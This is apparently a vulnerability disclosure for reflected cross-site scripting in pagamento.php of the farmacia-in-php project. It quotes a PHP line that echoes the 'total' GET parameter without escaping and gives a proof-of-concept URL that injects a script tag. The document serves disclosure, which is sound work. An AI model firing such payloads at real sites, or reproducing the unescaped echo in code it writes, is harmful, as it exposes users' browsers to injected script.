# farmacia-in-php has Cross Site Scripting vulnerability in pagamento.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
pagamento.php and total parameter.

## describe
There are unrestricted cross site scripting attacks and injection attacks in In pagamento.php of farmacia.  The controllable parameters are as follows: total parameter. This function will execute the user parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**    

Obtain the external parameters of total and pass them to echo, with unlimited output, resulting in a vulnerability of cross-site scripting attacks.

```
                    <input type="text" name="total" style="width: 150px" value="<?php echo $_GET['total']; ?>" disabled></label>
```

![image-20241127110953067](https://github.com/user-attachments/assets/e6c24466-9bf0-4423-a615-248ce594d1fb)

## POC

The browser accesses this URL

```
http://farmacia/pagamento.php?total="><script>alert('total');</script>
```

**Result**

The JS script code for the alert was executed

![image-20241127110825828](https://github.com/user-attachments/assets/c47e5bac-88b4-44db-ab84-b099e412ee1e)